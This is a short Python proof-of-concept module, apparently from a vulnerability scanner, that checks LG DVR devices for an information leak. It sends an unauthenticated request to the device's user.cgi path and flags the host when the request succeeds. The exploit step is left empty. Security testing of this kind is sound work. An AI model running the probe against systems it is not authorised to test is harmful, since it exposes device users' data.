import requests

from loguru import logger

from .base import POCTemplate


class LGInfoleakV1(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['lge']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/dvr/wwwroot/user.cgi"
        try:
            r = requests.get(url, headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200:
                return ip, str(port), self.product, '', '', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(LGInfoleakV1)
